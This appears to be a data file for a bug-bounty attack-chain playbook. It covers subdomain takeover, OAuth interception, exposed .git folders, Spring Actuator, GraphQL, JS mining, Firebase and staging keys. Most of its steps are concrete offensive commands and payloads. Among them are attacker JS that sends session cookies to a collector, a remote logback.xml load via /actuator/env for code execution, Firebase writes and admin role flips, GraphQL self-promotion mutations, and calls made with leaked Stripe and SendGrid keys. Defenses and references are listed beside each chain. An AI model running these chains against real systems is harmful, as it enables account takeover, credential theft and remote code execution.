chains.title: Dead subdomain, live CSP: dangling-CNAME takeover all the way to session theft
chains.impact: Execution of JS trusted by the main application, theft of the parent domain's session cookies and CSRF tokens, full session hijack. Typically pays out (more on an auth/SSO origin).
chains.why: The takeover by itself is not a bug; the dead subdomain is still listed in the main application's CSP script-src and shares the cookie scope Domain=.example.com, so claiming it turns a low-severity dangling-DNS finding into trusted code execution in production.
chains.precondition: The CNAME points to an unclaimed provider (*.github.io, *.herokudns.com, bucket.s3.amazonaws.com, *.azurewebsites.net, *.fastly.net), AND that host is present in the CSP or cookie scope of the main application.
chains.realWorld: HackerOne 'A Guide To Subdomain Takeovers 2.0'; MetaMask subdomain takeover (HackerOne #1717626).
chains.defense: Continuously diff dangling CNAMEs (dnsx -cname), remove decommissioned hosts from the CSP allowlist, use the __Host- cookie prefix.

steps.title: Enumerate subdomains and resolve CNAMEs
steps.detail: subfinder -d example.com -all | dnsx -cname -resp -silent

steps.title: Flag dangling and unclaimed targets
steps.detail: subjack -w hosts.txt -t 100 -ssl -c fingerprints.json -v  +  nuclei -t http/takeovers/ -l hosts.txt

steps.title: Claim the resource at the provider and host your own JS
steps.detail: register the exact-named GitHub Pages repo / S3 bucket / Azure app, then host attacker x.js

steps.title: Check the dead host in the CSP header
steps.detail: curl -sI https://app.example.com | grep -i content-security-policy  then look for the dead subdomain in script-src

steps.title: Load the script from the trusted origin
steps.detail: <script src="https://dead.example.com/x.js"></script>  passes CSP because the origin is allowlisted

steps.title: Steal the parent-domain cookies and the session
steps.detail: JS reads document.cookie or rides Domain=.example.com cookies and POSTs them to an attacker collector

chains.title: Dirty dancing on a dangling host: subdomain takeover → ATO via OAuth
chains.impact: Full account takeover by intercepting an OAuth code/access_token or SSO assertion; pre-account-takeover at scale. Typically pays out.
chains.why: A claimed dead subdomain that lands in the redirect_uri allowlist (or is reachable via a same-site redirect) catches the authorization code right in the flow and turns recon DNS dust into the keys to every linked account.
chains.precondition: The takeoverable subdomain is registered as a valid redirect_uri or reply URL of the target's OAuth client, OR the cookie is domain-scoped and a fixation cookie can be planted from the subdomain.
chains.realWorld: Frans Rosen 'Dirty Dancing in petite places'; Zoom OAuth/cookie-tossing ATO ($15k, 2024); GitPod cookie tossing CVE-2024-21583.
chains.defense: Exact redirect_uri comparison (no wildcards), remove decommissioned hosts from the allowlist, PKCE + response_mode=form_post, __Host- cookies.

steps.title: Map subdomains and takeover candidates
steps.detail: subfinder -d example.com | httpx -silent | nuclei -t http/takeovers/

steps.title: Gather the OAuth client config and the redirect allowlist
steps.detail: grep JS bundles for client_id, redirect_uri, response_type=token, /oauth/authorize

steps.title: Find a takeoverable host inside the allowlist
steps.detail: cross-reference dangling hosts against the allowed reply URLs

steps.title: Claim the dangling subdomain and set up an interceptor
steps.detail: register the unclaimed S3/Pages/Azure resource; host a page logging ?code=, fragment #access_token=, and postMessage data

steps.title: Craft an authorize URL pointing at the dead host
steps.detail: https://idp.example.com/authorize?client_id={CLIENT_ID}&redirect_uri=https://dead.example.com/cb&response_type=code&scope=...

steps.title: Replay the stolen code/token into the victim's session
steps.detail: exchange the stolen code at /oauth/token (Dirty Dancing response_type/response_mode confusion leaks fragment tokens cross-origin)

chains.title: From /.git/HEAD to AWS root: source-code leak → cloud takeover
chains.impact: Read/write to S3/RDS, IAM enumeration and escalation, sometimes full takeover of the cloud account or internal network. Typically pays out according to blast radius.
chains.why: A misconfigured web root quietly serves the entire .git folder; you rebuild the proprietary source offline and pull live AWS keys out of history that were deleted months ago but never rotated.
chains.precondition: https://host/.git/HEAD returns 'ref: refs/heads/...' (no directory listing needed, objects are pulled directly).
chains.realWorld: 'From .git directory to AWS EC2 network takeover' (alsolaiman); Appsecco 'Finding Treasures in Github and Exploiting AWS'.
chains.defense: Block .git at the web server/CDN, rotate keys on every commit (git-secrets pre-commit), least-privilege IAM, alert on sts:GetCallerIdentity from new ASNs.

steps.title: Scan for an exposed VCS directory
steps.detail: nuclei -t http/exposures/configs/git-config.yaml -l live.txt  (or curl -s https://host/.git/HEAD)

steps.title: Dump and rebuild the repository offline
steps.detail: git-dumper https://host/.git/ ./loot  (or GitTools gitdumper.sh + extractor.sh)

steps.title: Scan the entire history for secrets
steps.q: CI / repo secrets grep (AKIA / AIza / xox / ghp_ / .tfstate)
steps.detail: trufflehog filesystem ./loot --only-verified  and  gitleaks detect -s ./loot -v

steps.title: Pull keys from deleted blobs and old commits
steps.detail: git rev-list --all | xargs -I{} git grep -I AKIA {}

steps.title: Safely validate the cloud key
steps.detail: aws sts get-caller-identity  then  enumerate-iam --access-key ... --secret-key ...

steps.title: Enumerate resources and prove impact
steps.detail: aws s3 ls; aws iam list-attached-user-policies; prove read on one private object only; check privesc paths (iam:PassRole, CreatePolicyVersion), no bulk exfil

chains.title: Heapdump theft: Spring Actuator info leak → RCE
chains.impact: Theft of live secrets (DB credentials, cloud keys, signing keys) and often full RCE. Typically pays out (at RCE level).
chains.why: The /actuator/heapdump info leak is in fact a full JVM memory snapshot that you mine offline for live credentials, while a writable /actuator/env chains into code execution without any memory corruption.
chains.precondition: An Actuator path responds (/actuator, /actuator/health or legacy /heapdump, /env, /mappings); the fingerprint is JSON with _links or {"status":"UP"}.
chains.realWorld: Wiz 'Exploring Spring Boot Actuator Misconfigurations'; Maass 'Stealing Secrets Using Spring Actuators'; HackTricks Spring Actuators.
chains.defense: management.endpoints.web.exposure.include=health,info; move Actuator to a separate non-public port behind auth; strip env/heapdump/restart in production.

steps.title: Find Actuator endpoints
steps.detail: nuclei -t http/misconfiguration/springboot/ -u https://host  (or fuzz /actuator/{env,heapdump,mappings,gateway/routes})

steps.title: Pull the heap dump to disk
steps.detail: curl -s https://host/actuator/heapdump -o heap.hprof  (often hundreds of MB)

steps.title: Mine the dump for live secrets
steps.detail: Eclipse MAT / VisualVM OQL, or  strings heap.hprof | grep -iE 'password|secret|AKIA|x-api-key|jdbc:'

steps.title: RCE A: env/Eureka injection in Spring Cloud
steps.detail: POST eureka.client.serviceUrl.defaultZone XStream gadget to /actuator/env then hit /actuator/refresh

steps.title: RCE B: swap logging.config for your own logback
steps.detail: POST logging.config=http://attacker/logback.xml to /actuator/env then /actuator/restart

steps.title: RCE C: H2 CREATE ALIAS via an accessible datasource
steps.detail: set spring.datasource.url to an H2 mem DB and inject a Java stored procedure via CREATE ALIAS

chains.title: The schema says admin: GraphQL introspection → privilege escalation
chains.impact: Self-promotion to admin, access to other tenants' data, account takeover via undocumented mutations. Typically pays out.
chains.why: Introspection hands over the full undocumented schema (internal setRole/impersonate mutations that the UI never calls), and the absence of authz at the resolver level lets you invoke them directly.
chains.precondition: A GraphQL endpoint (/graphql, /api/graphql, /v1/graphql, Hasura/Apollo) responds to introspection, or 'did you mean' field suggestions are enabled even with introspection turned off.
chains.realWorld: HackerOne 'How a GraphQL Bug Resulted in Authentication Bypass'; a finding at the HackerOne Ambassador World Cup 2023; PortSwigger GraphQL labs.
chains.defense: Disable introspection and field suggestions in production, enforce authz in every resolver (not at the gateway), limit query depth and batching, persisted queries.

steps.title: Find the GraphQL endpoint
steps.detail: nuclei -t http/exposures/graphql-detect.yaml  (or probe {__typename})

steps.title: Dump the full schema
steps.detail: clairvoyance / graphql-cop / Burp InQL; if introspection is off, brute-force fields via suggestions

steps.title: Map mutations against authz gaps
steps.detail: flag updateUserRole, setIsAdmin, createInvite, impersonate, resetPassword(userId)

steps.title: Test object-level authz (BOLA)
steps.detail: query{ user(id:"VICTIM"){ email tokens } }  with your own session

steps.title: Invoke the privileged mutation directly
steps.detail: mutation{ updateUserRole(userId:"<me>", role:"ADMIN"){ ok } }

steps.title: Pivot to ATO via the change-email mutation
steps.detail: mutation{ changeEmail(userId:"VICTIM", email:"attacker@x") }

chains.title: The bundle is a map: JS mining → mass IDOR
chains.impact: Mass extraction of PII and other users' records via undocumented endpoints, sometimes access to the admin API. Typically pays out for the mass IDOR.
chains.why: Sourcemaps and webpack chunks reveal internal API hosts, role flags, and old hardcoded keys that were removed from the current code but never rotated, so you hit endpoints the application advertises nowhere.
chains.precondition: Reachable JS and sourcemap assets (main.hash.js, *.js.map), which holds for almost any SPA.
chains.realWorld: 'Hunting API Keys in JavaScript Files' (Medusa); the jsmon JS-recon guide; numerous sourcemap-IDOR writeups.
chains.defense: Strip sourcemaps from production, rotate any key that ever shipped to the client, enforce object-level authz on the server, treat any client-side key as public.

steps.title: Collect historical and live JS URLs
steps.detail: gau example.com | grep '\.js'  and  katana -u https://app.example.com -jc -d 3 -o js.txt

steps.title: De-minify via exposed sourcemaps
steps.detail: fetch *.js.map then  npx source-map-explorer / unpacker to restore names and paths

steps.title: Extract endpoints and secrets
steps.q: JS mass scan (fetch -> endpoints + secrets -> dedup)
steps.detail: linkfinder -i main.js -o cli  and  trufflehog filesystem ./js --only-verified / SecretFinder

steps.title: Diff for endpoints the UI never calls
steps.detail: flag /api/internal/*, /admin/*, isAdmin, feature-flag and debug routes

steps.title: Test object endpoints for missing authz
steps.detail: iterate GET /api/v2/users/{id}/invoices swapping {id} with your own token (BOLA)

steps.title: Reach private data with a stale key
steps.detail: curl -H "x-api-key: <leaked>" https://api.example.com/internal/export

chains.title: Config in plain sight: open Firebase → database takeover
chains.impact: Unauthenticated read of all user data and, when the rules = true, write/edit of records leading to account takeover, privilege flags, and data corruption. Typically pays out (critical when flipping the isAdmin/role field).
chains.why: A Firebase config in plain sight in the JS/APK is not a bug; the bug is the lazy rules '.read'/'.write': true, and the /.json trick turns the config leak into unauthenticated read AND write of the production database.
chains.precondition: The Firebase projectId/databaseURL is visible in the web bundle or APK (apiKey, project.firebaseio.com, project.firebasestorage.app).
chains.realWorld: Zego 'Firebase Database Takeover' (HackerOne #1065134); securitybreached 'Exploiting Insecure Firebase Database'; tauh33dkhan Insecure-Firebase repo.
chains.defense: Gate .read/.write behind auth != null plus ownership checks, restrict the Web API key, audit Storage rules, do not rely on the config being secret.

steps.title: Pull the Firebase config from the JS/APK
steps.detail: grep bundle for firebaseio.com / apiKey; for apps  apktool d app.apk  then grep google-services.json

steps.title: Test RTDB read with the REST trick
steps.detail: curl 'https://project.firebaseio.com/.json'  (200 + JSON = world-readable)

steps.title: Test write permissions
steps.detail: curl -X PUT -d '{"pwn":true}' 'https://project.firebaseio.com/test.json'

steps.title: Self-provision an account via Identity Toolkit
steps.detail: signupNewUser via identitytoolkit.googleapis.com?key=<apiKey>  when email/password auth is open

steps.title: Flip a privilege field on a record
steps.detail: PATCH /users/<uid>.json setting "role":"admin" / "isPremium":true

steps.title: Read a sensitive collection for proof
steps.detail: data-exposure proof gate: count records, screenshot one; report the exact insecure rule + least-privilege fix

chains.title: Door into staging: forgotten host + Swagger → shared-key abuse
chains.impact: Access to prod data through a less-protected twin, plus abuse of a shared SendGrid/Stripe/Twilio key (phishing from a trusted sender, fraudulent charges, PII exfiltration). Typically pays out when the keys are shared with prod.
chains.why: This is a multi-artifact finale: a forgotten staging./dev. host with debug enabled and weak authorization serves API docs that hand over a real integration key shared with prod, and three low findings add up to a single critical.
chains.precondition: A non-prod host resolves (staging., dev., uat., preprod., qa. or *.internal., surfaced in a certificate SAN or CT logs) and serves docs or debug.
chains.realWorld: keyhacks (streaak); Cybernews 'MailChimp, Mailgun, Sendgrid API leak'; common staging/Swagger BOLA writeups.
chains.defense: Keep non-prod off the public internet (IP allowlist/VPN), unique keys per environment, disable Swagger/Actuator/DEBUG anywhere internet-reachable, monitor third-party key usage by source IP.

steps.title: Pull non-prod hosts from CT logs and permutations
steps.detail: crt.sh?q=%25.example.com piped to dnsx, plus dnsgen/gotator permutations resolved with puredns

steps.title: Probe for weak authorization and debug toggles
steps.detail: staging-hardening gate: default creds, no WAF, ?debug=true, Django DEBUG=True traceback, phpinfo()

steps.title: Find API docs and collections
steps.detail: ffuf -u https://staging.example.com/FUZZ -w api-docs.txt  for /swagger.json, /openapi.json, /v2/api-docs, *.postman_collection.json, /actuator

steps.title: Import the spec and auto-build requests
steps.q: OpenAPI / Swagger mass tester (path x method)
steps.detail: load openapi.json into Burp/Postman; enumerate every operation incl. undocumented admin ones

steps.title: Harvest secrets from the staging surface
steps.detail: pull SENDGRID_API_KEY / STRIPE_SECRET / TWILIO_AUTH from /actuator/env, .env, or traceback locals

steps.title: Validate the key and check whether it's shared with prod
steps.detail: keyhacks: curl -H 'Authorization: Bearer SG.<key>' https://api.sendgrid.com/v3/scopes ; curl https://api.stripe.com/v1/charges -u sk_live_<key>:  then constrained PoC abuse, no spam; pivot reused creds to prod
